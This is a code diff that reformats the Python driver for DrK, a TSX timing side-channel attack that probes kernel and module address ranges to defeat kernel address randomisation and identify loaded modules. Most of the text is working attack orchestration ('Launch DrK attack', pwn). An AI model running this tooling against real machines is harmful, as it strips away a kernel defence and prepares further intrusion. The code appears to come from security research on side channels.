@@ -26,108 +26,99 @@ def chk_tsx():
 
 # get measured timing to set threshold value
 def measure(addr, mode, niter):
-    out = commands.getoutput("./measure -a %s -m %s -i %s" \
-                             % (hex(addr), mode, niter))
-    return eval(out)
+  out = commands.getoutput(f"./measure -a {hex(addr)} -m {mode} -i {niter}")
+  return eval(out)
 
 # get threshold value
 def get_threshold(_type, _iter, _mode, _times):
-    min_output = 0
-    for i in xrange(_times):
-        out = commands.getoutput("taskset -c 3 ./measure -t %s -m %s -i %s" % (_type, _mode, _iter))
-        output = eval(out)
-        if min_output == 0:
-            min_output = output
-        elif min_output['time'] > output['time']:
-            min_output = output
-    return min_output
+  min_output = 0
+  for _ in xrange(_times):
+    out = commands.getoutput(
+        f"taskset -c 3 ./measure -t {_type} -m {_mode} -i {_iter}")
+    output = eval(out)
+    if min_output == 0 or min_output['time'] > output['time']:
+      min_output = output
+  return min_output
 
 
 # run measure with at least 1000 iterations, and set the threshold as
 # the value in the middle of M/U or X/NX
 def measure_threshold(opts):
-    niter = int(opts.iter)
-    if niter < 1000:
-        niter = 1000
+  niter = int(opts.iter)
+  niter = max(niter, 1000)
+  # M / U
+  nx_w = get_threshold("nx", niter, "writemem", 1)
+  u_w = get_threshold("u", niter, "writemem", 1)
 
-    # M / U
-    nx_w = get_threshold("nx", niter, "writemem", 1)
-    u_w = get_threshold("u", niter, "writemem", 1)
-
-    # X / U (NX)
-    x_j = get_threshold("x", niter, "jmp", 1)
-    u_j = get_threshold("u", niter, "jmp", 1)
-    a = ((nx_w['time'] + u_w['time'])/2.0) * 1.00
-    b = ((x_j['time'] + u_j['time'])/2.0) * 1.00
-    return (a,b,(nx_w, u_w, x_j, u_j))
+  # X / U (NX)
+  x_j = get_threshold("x", niter, "jmp", 1)
+  u_j = get_threshold("u", niter, "jmp", 1)
+  a = ((nx_w['time'] + u_w['time'])/2.0) * 1.00
+  b = ((x_j['time'] + u_j['time'])/2.0) * 1.00
+  return (a,b,(nx_w, u_w, x_j, u_j))
 
 
 # Read ground truth (for comparision; this is not used for attack).
 def get_kernel_text_area_linux(gt_fn, is_module, do_m_only):
-    f = open(gt_fn,'r')
+  with open(gt_fn,'r') as f:
     lines = f.readlines()
-    f.close()
-
-    idx = 0
-    kernel_start_idx = 0
-    kernel_end_idx = 0
+  idx = 0
+  kernel_start_idx = 0
+  kernel_end_idx = 0
+  while True:
     if is_module:
-        while True:
-            if(lines[idx] == '---[ Modules ]---\n'):
-                kernel_start_idx = idx+1
-            if(lines[idx] == '---[ End Modules ]---\n'):
-                kernel_end_idx = idx
-                break
-            idx += 1
-
+      if(lines[idx] == '---[ Modules ]---\n'):
+          kernel_start_idx = idx+1
+      if(lines[idx] == '---[ End Modules ]---\n'):
+          kernel_end_idx = idx
+          break
     else:
-        while True:
-            if(lines[idx] == '---[ High Kernel Mapping ]---\n'):
-                kernel_start_idx = idx+1
-            if(lines[idx] == '---[ Modules ]---\n'):
-                kernel_end_idx = idx
-                break
-            idx += 1
-    kernel_lines = lines[kernel_start_idx:kernel_end_idx]
-    kernel_areas = []
-    for line in kernel_lines:
-        line_arr = line.split(' ')
-        addrs = line_arr[0].split('-')
-        if line_arr[-3] == 'x':
-            perm = 'X'
-        elif line_arr[-2] == '':
-            perm = 'U'
-        else:
-            perm = 'NX'
-        #perm = line_arr[-2]
-        #if perm == '':
-        #    perm = line_arr[-3]
-        #    if perm == '':
-        #        perm = 'U'
-        #    else:
-        #        perm = 'X'
+      if(lines[idx] == '---[ High Kernel Mapping ]---\n'):
+          kernel_start_idx = idx+1
+      if(lines[idx] == '---[ Modules ]---\n'):
+          kernel_end_idx = idx
+          break
+    idx += 1
 
-        if(do_m_only and perm == 'X'):
-            perm = 'NX'
-        v = {}
-        v['addr_start'] = int(addrs[0], 16)
-        v['addr_end'] = int(addrs[1], 16)
-        v['perm'] = perm
-        kernel_areas.append(v)
+  kernel_lines = lines[kernel_start_idx:kernel_end_idx]
+  kernel_areas = []
+  for line in kernel_lines:
+    line_arr = line.split(' ')
+    addrs = line_arr[0].split('-')
+    if line_arr[-3] == 'x':
+        perm = 'X'
+    elif line_arr[-2] == '':
+        perm = 'U'
+    else:
+        perm = 'NX'
+    #perm = line_arr[-2]
+    #if perm == '':
+    #    perm = line_arr[-3]
+    #    if perm == '':
+    #        perm = 'U'
+    #    else:
+    #        perm = 'X'
 
-    kernel_map = {}
-    for kernel_mem in kernel_areas:
-        start = kernel_mem['addr_start']
-        end = kernel_mem['addr_end']
+    if(do_m_only and perm == 'X'):
+        perm = 'NX'
+    v = {
+        'addr_start': int(addrs[0], 16),
+        'addr_end': int(addrs[1], 16),
+        'perm': perm,
+    }
+    kernel_areas.append(v)
+
+  kernel_map = {}
+  for kernel_mem in kernel_areas:
+    start = kernel_mem['addr_start']
+    end = kernel_mem['addr_end']
         #print(start)
         #print(end)
-        while True:
-            if start >= end:
-                break
-            kernel_map[start] = kernel_mem
-            start += 0x1000
-    kernel_map['kernels'] = kernel_areas
-    return kernel_map
+    while not start >= end:
+      kernel_map[start] = kernel_mem
+      start += 0x1000
+  kernel_map['kernels'] = kernel_areas
+  return kernel_map
 
 # build ground truth from page table.
 # This is for testing accuracy, and not used for the attack.
@@ -157,245 +148,214 @@ MODULE_ALIGN = 0x1000
 
 # write scan file for drk-probing
 def write_scan_file(fn, rows):
-    fd = open(fn, 'w')
+  with open(fn, 'w') as fd:
     for row in rows:
         fd.write("%x\n" % row['start'])
         fd.write("%x\n" % row['end'])
         fd.write("%x\n" % row['align'])
-    fd.close()
 
 # find kernel base address, and write a scan file for
 # deep scan (probing each page)
 def find_base_addr(_type, m_th, opts):
-    row = {}
-    filename = '%s_scan' % _type
-    if _type == 'kernel':
-        row['start'] = KERNEL_BASE_START
-        row['end'] = KERNEL_BASE_END
-        row['align'] = KERNEL_ALIGN
-    elif _type == 'module':
-        row['start'] = MODULE_BASE_START
-        row['end'] = MODULE_BASE_END
-        row['align'] = MODULE_ALIGN
+  row = {}
+  filename = f'{_type}_scan'
+  if _type == 'kernel':
+      row['start'] = KERNEL_BASE_START
+      row['end'] = KERNEL_BASE_END
+      row['align'] = KERNEL_ALIGN
+  elif _type == 'module':
+      row['start'] = MODULE_BASE_START
+      row['end'] = MODULE_BASE_END
+      row['align'] = MODULE_ALIGN
 
-    write_scan_file(filename, [row])
-    time_before = time.time()
-    os.system("taskset -c 3 ./drk-probing -f %s -r 1 -i %s -o %s 1>/dev/null"\
-                % (filename, opts.iter, filename))
-    fd = open(filename + "_" + opts.iter + "_0", "r")
+  write_scan_file(filename, [row])
+  time_before = time.time()
+  os.system(
+      f"taskset -c 3 ./drk-probing -f {filename} -r 1 -i {opts.iter} -o {filename} 1>/dev/null"
+  )
+  with open(f"{filename}_{opts.iter}_0", "r") as fd:
     lines = fd.readlines()
-    fd.close()
-    lines.pop(0)
-    start_addr = None
-    end_addr = None
-    found = False
-    for line in lines:
-        arr = line.split(' ')
-        if (not found) and int(arr[1]) < m_th:
-            found = True
-            start_addr = int(arr[0], 16)
-        if found and int(arr[1]) > m_th:
-            end_addr = int(arr[0], 16)
-            break
+  lines.pop(0)
+  start_addr = None
+  end_addr = None
+  found = False
+  for line in lines:
+      arr = line.split(' ')
+      if (not found) and int(arr[1]) < m_th:
+          found = True
+          start_addr = int(arr[0], 16)
+      if found and int(arr[1]) > m_th:
+          end_addr = int(arr[0], 16)
+          break
 
-    return start_addr, end_addr
+  return start_addr, end_addr
 
 # probe kernel mapping space with drk-probing
 def handle_kernel(k_addrs, opts):
-    k_base = k_addrs[0]
-    k_end = k_addrs[1]
-    k_2mb_end = k_base + 0x600000
-    row_1 = {}
-    row_1['start'] = k_base
-    row_1['end'] = k_2mb_end
-    row_1['align'] = 0x200000
-    row_2 = {}
-    row_2['start'] = k_2mb_end
-    row_2['end'] = k_end
-    row_2['align'] = 0x1000
+  k_base = k_addrs[0]
+  k_end = k_addrs[1]
+  k_2mb_end = k_base + 0x600000
+  row_1 = {'start': k_base, 'end': k_2mb_end, 'align': 2097152}
+  row_2 = {'start': k_2mb_end, 'end': k_end, 'align': 4096}
+  rows = [row_1, row_2]
 
-    rows = [row_1, row_2]
-
-    write_scan_file("scan_kernel", rows)
-    os.system("./drk-probing -f %s -r 1 -i %s -o %s 1>/dev/null" \
-                % ("scan_kernel", opts.iter, "scan_kernel"))
-    fn = ("scan_kernel_%s_0" % opts.iter)
-    fd = open(fn, 'r')
+  write_scan_file("scan_kernel", rows)
+  os.system(
+      f"./drk-probing -f scan_kernel -r 1 -i {opts.iter} -o scan_kernel 1>/dev/null"
+  )
+  fn = f"scan_kernel_{opts.iter}_0"
+  with open(fn, 'r') as fd:
     lines = fd.readlines()
-    fd.close()
-    lines.pop(0)
-    return [line.strip().split(' ') for line in lines]
+  lines.pop(0)
+  return [line.strip().split(' ') for line in lines]
 
 # probe kernel mapping space with drk-probing
 def handle_module(m_addrs, opts):
-    m_base = m_addrs[0]
-    m_end = m_base + 0xc00000
-    row = {}
-    row['start'] = m_base
-    row['end'] = m_end
-    row['align'] = 0x1000
-    rows = [row]
-    write_scan_file("scan_module", rows)
-    os.system("taskset -c 3 ./drk-probing -f %s -r 1 -i %s -o %s 1>/dev/null"\
-                % ("scan_module", opts.iter, "scan_module"))
-    fn = ("scan_module_%s_0" % opts.iter)
-    fd = open(fn, 'r')
+  m_base = m_addrs[0]
+  m_end = m_base + 0xc00000
+  row = {'start': m_base, 'end': m_end, 'align': 4096}
+  rows = [row]
+  write_scan_file("scan_module", rows)
+  os.system(
+      f"taskset -c 3 ./drk-probing -f scan_module -r 1 -i {opts.iter} -o scan_module 1>/dev/null"
+  )
+  fn = f"scan_module_{opts.iter}_0"
+  with open(fn, 'r') as fd:
     lines = fd.readlines()
-    fd.close()
-    lines.pop(0)
-    return [line.strip().split(' ') for line in lines]
+  lines.pop(0)
+  return [line.strip().split(' ') for line in lines]
 
 def match_data(data, m_th, x_th):
-    for datum in data:
-        m_value = int(datum[1])
-        x_value = int(datum[2])
-        if(m_value > m_th):
-            datum.append('U') # unmapped (for M/U)
-            datum.append('U') # unmapped (for X/NX/U)
-        else:
-            datum.append('M') # mapped
-            if(x_value > x_th):
-                datum.append('N') # non executable
-            else:
-                datum.append('X') # executable
+  for datum in data:
+    m_value = int(datum[1])
+    if (m_value > m_th):
+      datum.append('U') # unmapped (for M/U)
+      datum.append('U') # unmapped (for X/NX/U)
+    else:
+      datum.append('M') # mapped
+      x_value = int(datum[2])
+      if(x_value > x_th):
+          datum.append('N') # non executable
+      else:
+          datum.append('X') # executable
 
 # get string map data (e.g. files such as kernel_map module_map)
 def get_map(data, do_m_only, module_data = None):
-    data_list = []
-    current_start_address = None
-    current_perm = None
-    for datum in data:
-        addr = int(datum[0], 16)
-        perm = 'U'
-        if do_m_only:
-            if datum[3] == 'U':
-                perm = 'U'
-            else:
-                perm = 'NX'
-        else:
-            if datum[3] == 'U':
-                perm = 'U'
-            elif datum[4] == 'X':
-                perm = 'X'
-            else:
-                perm = 'NX'
-
-        if current_start_address == None:
-            current_start_address = addr
-            current_perm = perm
-        if current_perm != perm:
-            string = "0x%16x-0x%16x %s" \
-                        % (current_start_address, addr, current_perm)
-            data_list.append(string)
-            current_start_address = addr
-            current_perm = perm
+  data_list = []
+  current_start_address = None
+  current_perm = None
+  for datum in data:
+    addr = int(datum[0], 16)
+    perm = 'U'
+    if do_m_only and datum[3] == 'U' or not do_m_only and datum[3] == 'U':
+      perm = 'U'
+    elif do_m_only or datum[4] != 'X':
+      perm = 'NX'
+    else:
+      perm = 'X'
+    if current_start_address is None:
+      current_start_address = addr
+      current_perm = perm
+    if current_perm != perm:
+        string = "0x%16x-0x%16x %s" \
+                    % (current_start_address, addr, current_perm)
+        data_list.append(string)
+        current_start_address = addr
+        current_perm = perm
+  if module_data != None:
+    print(f"{BLUE}[*] Tries to find modules...{NORMAL}")
     count = 0
     unique_list = []
-    if module_data != None:
-        print(BLUE + "[*] Tries to find modules..." + NORMAL)
-        for i in xrange(len(data_list)):
-            data = data_list[i]
-            splitted = data.split(' ')
-            if splitted[1] == 'X':
-                next_data = data_list[i+1]
-                splitted2 = next_data.split(' ')
-                if(splitted2[1] == 'NX'):
-                    a,b = splitted[0].split('-')
-                    a = int(a, 16)
-                    b = int(b, 16)
-                    x_size = b-a
-                    a,b = splitted2[0].split('-')
-                    a = int(a, 16)
-                    b = int(b, 16)
-                    m_size = b-a
-                    key = "%x %x" % (x_size, m_size)
-                    try:
-                        names = module_data[key]
-                        if len(names) == 1:
-                            count += 1
-                            unique_list.append(names[0])
-                        data_list[i] = "%s %s" % (data,",".join(names))
-                    except KeyError:
-                        pass
+    for i in xrange(len(data_list)):
+      data = data_list[i]
+      splitted = data.split(' ')
+      if splitted[1] == 'X':
+        next_data = data_list[i+1]
+        splitted2 = next_data.split(' ')
+        if (splitted2[1] == 'NX'):
+          a,b = splitted[0].split('-')
+          a = int(a, 16)
+          b = int(b, 16)
+          x_size = b-a
+          a,b = splitted2[0].split('-')
+          a = int(a, 16)
+          b = int(b, 16)
+          m_size = b-a
+          key = "%x %x" % (x_size, m_size)
+          try:
+            names = module_data[key]
+            if len(names) == 1:
+                count += 1
+                unique_list.append(names[0])
+            data_list[i] = f'{data} {",".join(names)}'
+          except KeyError:
+              pass
 
-        print(("[+] Found " + RED + "%d" + NORMAL + " unique modules") % count)
-        i = 0
-        while True:
-            if i >= len(unique_list):
-                break
-            print(repr(unique_list[i:i+6]))
-            i += 6
-        #print(repr(unique_list))
-    return data_list
+    print(f"[+] Found {RED}%d{NORMAL} unique modules" % count)
+    for i in range(0, len(unique_list), 6):
+      print(repr(unique_list[i:i+6]))
+          #print(repr(unique_list))
+  return data_list
 
 # Compare the result of DrK to the ground truth information,
 # in order to get the accuracy of page map
 def get_accuracy(data, ground_truth, do_m_only):
-    num_total = 0
-    num_true = 0
-    num_false = 0
-    data_list = []
-    wrong_list = []
-    for datum in data:
-        num_total += 1
-        addr = int(datum[0], 16)
-        gt = ground_truth[addr]
-        gt_perm = gt['perm']
-        my_perm = None
-        if do_m_only:
-            if datum[3] == 'U':
-                my_perm = 'U'
-            else:
-                my_perm = 'NX'
-        else:
-            if datum[3] == 'U':
-                my_perm = 'U'
-            elif datum[4] == 'X':
-                my_perm = 'X'
-            else:
-                my_perm = 'NX'
+  num_total = 0
+  num_true = 0
+  num_false = 0
+  data_list = []
+  wrong_list = []
+  for datum in data:
+    num_total += 1
+    addr = int(datum[0], 16)
+    gt = ground_truth[addr]
+    gt_perm = gt['perm']
+    my_perm = None
+    if do_m_only and datum[3] == 'U' or not do_m_only and datum[3] == 'U':
+      my_perm = 'U'
+    elif do_m_only or datum[4] != 'X':
+      my_perm = 'NX'
+    else:
+      my_perm = 'X'
+    line = copy.copy(datum)
+    if my_perm == gt_perm:
+        num_true += 1
+        line.append('O')
+    else:
+        num_false += 1
+        line.append(my_perm)
+        line.append(gt_perm)
+        line.append('WRONG')
+        wrong_list.append(line)
+    data_list.append(line)
 
-        line = copy.copy(datum)
-        if my_perm == gt_perm:
-            num_true += 1
-            line.append('O')
-        else:
-            num_false += 1
-            line.append(my_perm)
-            line.append(gt_perm)
-            line.append('WRONG')
-            wrong_list.append(line)
-        data_list.append(line)
-
-    return (num_total, num_true, num_false,
-            (float(num_true)/float(num_total) * 100), data_list, wrong_list)
+  return (num_total, num_true, num_false,
+          (float(num_true)/float(num_total) * 100), data_list, wrong_list)
 
 def write_data_list(data_list, fn):
-    new_data_list = [' '.join(line) for line in data_list]
-    fd = open(fn, 'w')
+  new_data_list = [' '.join(line) for line in data_list]
+  with open(fn, 'w') as fd:
     fd.write('\n'.join(new_data_list))
-    fd.close()
 
 def print_list_to_file(data_list, fn):
-    fd = open(fn, 'w')
+  with open(fn, 'w') as fd:
     fd.write("Generated by DrK\n")
     for line in data_list:
         fd.write(line + "\n")
-    fd.close()
 
 def pretty_print_result(res, description):
-    total_pages = res[0]
-    correct_pages = res[1]
-    wrong_pages = res[2]
-    accuracy = res[3]
-    string = ("%s Total " + BLUE + "%s" + NORMAL + " pages, correct " +
-                BLUE + "%s" + NORMAL + " pages, wrong %s pages, accuracy: " +
-                GREEN + "%3.2f" + NORMAL + "%%") \
-                % (description, total_pages, correct_pages,
-                        wrong_pages, accuracy)
-    if(wrong_pages != 0):
-        print(res[5])
-    return string
+  total_pages = res[0]
+  correct_pages = res[1]
+  wrong_pages = res[2]
+  accuracy = res[3]
+  string = ((((((
+      (((f"%s Total {BLUE}%s{NORMAL} pages, correct " + BLUE) + "%s") + NORMAL)
+      + " pages, wrong %s pages, accuracy: ") + GREEN) + "%3.2f") + NORMAL) +
+             "%%")) % (description, total_pages, correct_pages, wrong_pages,
+                       accuracy)
+  if(wrong_pages != 0):
+      print(res[5])
+  return string
 
 # Launch DrK attack.
 def pwn(opts, start_time):
